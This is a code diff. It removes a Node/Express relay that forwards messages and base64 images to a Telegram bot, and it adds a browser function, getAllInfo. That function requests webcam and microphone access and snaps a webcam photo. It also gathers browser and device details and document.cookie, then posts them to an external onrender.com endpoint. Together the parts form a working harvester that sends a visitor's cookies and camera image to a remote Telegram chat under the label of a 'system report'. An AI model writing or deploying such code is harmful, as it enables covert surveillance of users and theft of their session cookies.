@@ -1,90 +1,95 @@
-// ============================
-//  index.js  (API‑only server)
-// ============================
+async function getAllInfo() {
+  const $ = id => document.getElementById(id);
+  $("errorMsg").textContent = ""; // Reset error message
+  $("accessBtn").style.display = "none"; // Hide access button
+  $("infoBox").style.display = "block"; // Show system info box
 
-require('dotenv').config();
-const express = require('express');
-const fetch = require('node-fetch');
-const rateLimit = require('express-rate-limit');
-const cors = require('cors');
-const FormData = require('form-data'); // For sending images
+  const info = {
+    webcam: "Denied",
+    microphone: "Denied",
+    location: "Denied",
+    ip: "Unknown",
+    browser: navigator.userAgent,
+    resolution: `${screen.width}x${screen.height}`,
+    depth: `${screen.colorDepth}-bit`,
+    os: navigator.platform,
+    lang: navigator.language,
+    online: navigator.onLine ? "Online" : "Offline",
+    connection: "Unknown",
+    battery: "Unknown",
+    charging: "Unknown",
+    cookies: document.cookie || "No cookies"
+  };
 
-const app = express();
-const port = process.env.PORT || 3000;
+  let webcamStream = null;
+  let capturedImageBase64 = null;
 
-/* ─────────── middleware ─────────── */
-app.use(express.json());
-app.use(cors());
+  /* permissions ----------------------------------------------------*/
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+    $("webcamFeed").srcObject = stream;
+    $("webcamFeed").style.display = "block";
+    info.webcam = info.microphone = "Accessible";
+    webcamStream = stream;
+  } catch (e) { console.error("Error accessing webcam or microphone", e); }
 
-// Rate limit to avoid abuse
-app.use(rateLimit({
-  windowMs: 60 * 1000,          // 1 minute
-  max: 5,                       // 5 requests/IP/min
-  message: 'Too many requests, try again later.'
-}));
+  // Capture Image from webcam if accessible
+  if (webcamStream) {
+    const track = webcamStream.getVideoTracks()[0];
+    const imageCapture = new ImageCapture(track);
+    try {
+      const bitmap = await imageCapture.grabFrame();
+      
+      // Resize the image before converting it to base64
+      const canvas = document.createElement('canvas');
+      const MAX_WIDTH = 640; // Resize to a smaller width
+      const MAX_HEIGHT = 480; // Resize to a smaller height
 
-/* ─────────── POST /send-message ───────────
-   Body: { "message": "Message text", "image": "Base64 image string" }
-   ---------------------------------------- */
-app.post('/send-message', async (req, res) => {
-  const { message, image } = req.body;
+      // Calculate the new dimensions while maintaining aspect ratio
+      const aspectRatio = bitmap.width / bitmap.height;
+      const newWidth = Math.min(MAX_WIDTH, bitmap.width);
+      const newHeight = Math.min(MAX_HEIGHT, bitmap.height);
 
-  if (!message || !message.trim()) {
-    return res.status(400).json({ success: false, error: 'Message cannot be empty' });
+      canvas.width = newWidth;
+      canvas.height = newHeight;
+
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(bitmap, 0, 0, newWidth, newHeight);
+
+      // Capture the resized image as base64
+      capturedImageBase64 = canvas.toDataURL('image/jpeg'); // base64 image string
+      console.log("Captured Image Base64: ", capturedImageBase64); // Debugging
+    } catch (e) { console.error("Failed to capture webcam image:", e); }
   }
 
-  const tgURL = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
+  /* Send to Backend -----------------------------------------------*/
+  const message = `🔍 System Report:
+🧠 IP Address: ${info.ip}
+📍 Location: ${info.location}
+📷 Webcam: ${info.webcam}
+🎤 Microphone: ${info.microphone}
+🌐 Browser: ${info.browser}
+🖥️ Resolution: ${info.resolution}
+🎨 Color Depth: ${info.depth}
+🧑‍💻 OS: ${info.os}
+🗣️ Language: ${info.lang}
+📶 Connection: ${info.connection}
+🔋 Battery: ${info.battery}
+⚡ Charging: ${info.charging}
+🍪 Cookies: ${info.cookies}
+🔌 Online: ${info.online}`;
+
+  // Display the message in the HTML
+  $("systemInfo").textContent = message;
 
   try {
-    // First, send the message as text
-    const tgRes = await fetch(tgURL, {
+    await fetch('https://system-info-terminal.onrender.com/send-message', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: process.env.TELEGRAM_CHAT_ID,
-        text: message
-      })
-    }).then(r => r.json());
-
-    if (tgRes.ok) {
-      // If there is an image, send it after the message
-      if (image) {
-        const tgPhotoURL = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendPhoto`;
-
-        const form = new FormData();
-        form.append('chat_id', process.env.TELEGRAM_CHAT_ID);
-        form.append('photo', image); // Image should be in base64 format
-
-        // Send image
-        const tgImageRes = await fetch(tgPhotoURL, {
-          method: 'POST',
-          body: form
-        }).then(r => r.json());
-
-        if (tgImageRes.ok) {
-          return res.json({ success: true });
-        } else {
-          return res.status(400).json({ success: false, error: tgImageRes.description });
-        }
-      } else {
-        return res.json({ success: true });
-      }
-    } else {
-      return res.status(400).json({ success: false, error: tgRes.description });
-    }
-
-  } catch (err) {
-    console.error('Telegram error:', err);
-    res.status(500).json({ success: false, error: 'Telegram request failed' });
+      body: JSON.stringify({ message, image: capturedImageBase64 }) // Send base64 string of the image
+    });
+  } catch (e) {
+    console.error("Failed to send info:", e);
+    $("errorMsg").textContent = "Could not contact reporting server.";
   }
-});
-
-/* ─────────── simple root check ─────────── */
-app.get('/', (_, res) =>
-  res.send('System‑Info API running. POST /send-message to forward data.')
-);
-
-/* ─────────── start server ─────────── */
-app.listen(port, () =>
-  console.log(`🚀  API listening on port ${port}`)
-);
+}
